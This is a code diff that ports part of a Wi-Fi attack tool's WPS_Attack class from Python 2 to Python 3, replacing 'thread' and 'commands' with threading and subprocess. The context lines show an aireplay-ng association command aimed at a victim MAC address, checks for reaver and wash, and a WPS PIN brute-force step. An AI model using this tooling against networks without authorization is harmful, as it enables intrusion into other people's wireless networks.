@@ -27,9 +27,7 @@
 
 import re
 import time
-import thread
-import signal
-import commands
+import threading
 import subprocess
 import webbrowser
 
@@ -65,8 +63,8 @@ class WPS_Attack(QtCore.QThread):
         '''Checks if the reaver tool is installed'''
         sys_proc_a = "which reaver"
         sys_proc_b = "which wash"
-        return_code_1 = commands.getstatusoutput(sys_proc_a)[0]
-        return_code_2 = commands.getstatusoutput(sys_proc_b)[0]
+        return_code_1 = subprocess.getstatusoutput(sys_proc_a)[0]
+        return_code_2 = subprocess.getstatusoutput(sys_proc_b)[0]
 
         if(bool(return_code_1 or return_code_2)):
             return(False)
@@ -106,7 +104,8 @@ class WPS_Attack(QtCore.QThread):
 
 
     def _associate_WPS_Device_Aireplay(self):
-        thread.start_new_thread(self._start_Airodump,())
+        t = threading.Thread(target=self._start_Airodump)
+        t.start()
         time.sleep(2)
         while(self._attack_control):
             subprocess.Popen('aireplay-ng -1 0 -a %s -h %s %s'%(self.victim_MAC_Addr,self.monitor_mac_address,self.monitor_interface),shell=True,
@@ -178,7 +177,8 @@ class WPS_Attack(QtCore.QThread):
         self._wps_pin = str()
         self._associate_flag = False
         self.Associating_with_WPS_device_signal.emit()
-        thread.start_new_thread(self._associate_WPS_Device_Aireplay,())
+        t = threading.Thread(target=self._associate_WPS_Device_Aireplay)
+        t.start()
         time.sleep(3)
         self._bruteforce_WPS_Device()
 
@@ -193,7 +193,8 @@ class WPS_Attack(QtCore.QThread):
 
     def start_WPS_Devices_Scan(self):
         self._scan_control = True
-        thread.start_new_thread(self._scan_WPS_Devices_Worker,())
+        t = threading.Thread(target=self._scan_WPS_Devices_Worker)
+        t.start()
 
 
     def stop_WPS_Scanning(self):
